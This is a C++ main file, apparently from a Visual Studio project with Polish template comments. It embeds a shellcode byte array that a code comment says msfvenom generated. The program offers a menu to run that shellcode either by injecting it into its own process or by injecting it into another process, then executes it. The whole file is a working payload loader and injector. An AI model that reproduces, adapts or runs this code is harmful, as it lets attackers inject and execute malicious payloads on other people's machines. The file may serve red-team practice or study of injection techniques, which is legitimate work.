// Main.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
//

#include <iostream>

#include "ShellcodeExecution/ShellcodeSelfInjector.h"
#include "ShellcodeExecution/ShellcodeProcessInjector.h"

int main()
{
    using namespace ShellcodeExecution;

    // shellcode generated with msfvenom
    unsigned char shellcode[] =
        "\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
        "\xff\xff\xff\x48\xbb\x28\xd1\xc4\x3b\xa1\x70\x04\x25\x48"
        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xd4\x99\x47"
        "\xdf\x51\x98\xc4\x25\x28\xd1\x85\x6a\xe0\x20\x56\x74\x7e"
        "\x99\xf5\xe9\xc4\x38\x8f\x77\x48\x99\x4f\x69\xb9\x38\x8f"
        "\x77\x08\x99\x4f\x49\xf1\x38\x0b\x92\x62\x9b\x89\x0a\x68"
        "\x38\x35\xe5\x84\xed\xa5\x47\xa3\x5c\x24\x64\xe9\x18\xc9"
        "\x7a\xa0\xb1\xe6\xc8\x7a\x90\x95\x73\x2a\x22\x24\xae\x6a"
        "\xed\x8c\x3a\x71\xfb\x84\xad\x28\xd1\xc4\x73\x24\xb0\x70"
        "\x42\x60\xd0\x14\x6b\x2a\x38\x1c\x61\xa3\x91\xe4\x72\xa0"
        "\xa0\xe7\x73\x60\x2e\x0d\x7a\x2a\x44\x8c\x6d\x29\x07\x89"
        "\x0a\x68\x38\x35\xe5\x84\x90\x05\xf2\xac\x31\x05\xe4\x10"
        "\x31\xb1\xca\xed\x73\x48\x01\x20\x94\xfd\xea\xd4\xa8\x5c"
        "\x61\xa3\x91\xe0\x72\xa0\xa0\x62\x64\xa3\xdd\x8c\x7f\x2a"
        "\x30\x18\x6c\x29\x01\x85\xb0\xa5\xf8\x4c\x24\xf8\x90\x9c"
        "\x7a\xf9\x2e\x5d\x7f\x69\x89\x85\x62\xe0\x2a\x4c\xa6\xc4"
        "\xf1\x85\x69\x5e\x90\x5c\x64\x71\x8b\x8c\xb0\xb3\x99\x53"
        "\xda\xd7\x2e\x99\x73\x1b\x71\x04\x25\x28\xd1\xc4\x3b\xa1"
        "\x38\x89\xa8\x29\xd0\xc4\x3b\xe0\xca\x35\xae\x47\x56\x3b"
        "\xee\x1a\x80\xb1\x87\x7e\x90\x7e\x9d\x34\xcd\x99\xda\xfd"
        "\x99\x47\xff\x89\x4c\x02\x59\x22\x51\x3f\xdb\xd4\x75\xbf"
        "\x62\x3b\xa3\xab\x51\xa1\x29\x45\xac\xf2\x2e\x11\x58\xc0"
        "\x1c\x67\x0b\x4d\xa9\xa1\x3b\xa1\x70\x04\x25";

    
    ShellcodeExecutor* shellExec;
    
    std::cout << "Options:" << std::endl;
    std::cout << "1. Self injection" << std::endl;
    std::cout << "2. Process injection" << std::endl;
    std::cout << "> ";

    int choice;
    std::cin >> choice;

    switch (choice)
    {
    case 1:
        shellExec = new ShellcodeSelfInjector(shellcode, sizeof(shellcode));
        break;
    case 2:
        shellExec = new ShellcodeProcessInjector(shellcode, sizeof(shellcode));
        break;
    default:
        std::cout << "Unknown option" << std::endl;
        return 1;
    }
    
    shellExec->Execute();

    delete shellExec;
}

// Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania
// Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie

// Porady dotyczące rozpoczynania pracy:
//   1. Użyj okna Eksploratora rozwiązań, aby dodać pliki i zarządzać nimi
//   2. Użyj okna programu Team Explorer, aby nawiązać połączenie z kontrolą źródła
//   3. Użyj okna Dane wyjściowe, aby sprawdzić dane wyjściowe kompilacji i inne komunikaty
//   4. Użyj okna Lista błędów, aby zobaczyć błędy
//   5. Wybierz pozycję Projekt > Dodaj nowy element, aby utworzyć nowe pliki kodu, lub wybierz pozycję Projekt > Dodaj istniejący element, aby dodać istniejące pliku kodu do projektu
//   6. Aby w przyszłości ponownie otworzyć ten projekt, przejdź do pozycji Plik > Otwórz > Projekt i wybierz plik sln
